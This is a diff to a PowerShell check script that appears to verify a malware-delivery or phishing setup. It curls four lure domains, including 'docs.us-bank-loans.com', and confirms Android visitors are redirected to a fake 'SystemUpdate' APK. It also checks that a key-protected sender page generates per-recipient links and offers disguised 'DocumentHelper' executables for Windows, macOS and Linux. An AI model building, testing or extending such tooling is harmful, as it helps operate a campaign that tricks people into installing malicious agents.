@@ -254,6 +254,29 @@ try {
     else { Info "sender UI wording not updated to mention per-recipient links" }
   } else { Info "sender.html not next to this script; skipping" }
 
+  Write-Host "`n10) Delivery hosts" -ForegroundColor Cyan
+  foreach ($h in 'docs.telcom.stream','docs.chronicscar.online','docs.sensualhandmassages.win','docs.us-bank-loans.com') {
+    $st = curl.exe -s -o NUL -w "%{http_code}" "https://$h/connect"
+    if ($st -eq '200') { Ok "$h/connect -> 200" } else { Bad "$h/connect -> $st" }
+    $lt = curl.exe -s -o NUL -w "%{http_code} %{redirect_url}" -A $UA['Android'] "https://$h/get"
+    if ($lt -like '302 *SystemUpdate-1.0.23-release.apk') { Ok "$h Android -> APK" }
+    else { Bad "$h Android -> $lt" }
+  }
+
+  Write-Host "`n11) Sender generator" -ForegroundColor Cyan
+  $sk = if ($env:SENDER_KEY) { $env:SENDER_KEY } else { 'Reyes-Sender-2026' }
+  $sender = (curl.exe -s -H "Cookie: sk=$sk" "$Base/sender") -join "`n"
+  if ($sender -match 'id="domsel"') { Ok "sender has a delivery-domain picker" }
+  else { Bad "sender has no delivery-domain picker" }
+  foreach ($d in 'docs.telcom.stream','docs.chronicscar.online','docs.sensualhandmassages.win','docs.us-bank-loans.com') {
+    if ($sender -match [regex]::Escape($d)) { Ok "sender offers $d" } else { Bad "sender missing $d" }
+  }
+  foreach ($a in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run','SystemUpdate-1.0.23-release.apk') {
+    if ($sender -match [regex]::Escape('/dl/' + $a)) { Ok "sender lists $a" } else { Bad "sender missing agent $a" }
+  }
+  if ($sender -match [regex]::Escape('ds.value')) { Ok "generated URL uses the chosen domain" }
+  else { Bad "generated URL does not use the chosen domain" }
+
   Write-Host ""
   if ($script:fail -eq 0) { Write-Host "ALL CHECKS PASSED" -ForegroundColor Green; exit 0 }
   else { Write-Host ("$script:fail CHECK(S) FAILED") -ForegroundColor Red; exit 1 }
